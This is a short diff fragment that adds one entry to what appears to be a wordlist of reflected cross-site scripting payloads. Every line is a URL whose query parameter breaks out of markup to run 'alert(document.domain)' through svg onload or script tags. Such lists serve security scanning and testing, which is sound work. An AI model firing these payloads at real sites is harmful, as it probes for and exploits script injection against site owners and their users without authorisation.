@@ -987,3 +987,4 @@ request?info=<svg onload=alert(
 /help/top.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
 /help/top.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
 /
+/?ru&filter=%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
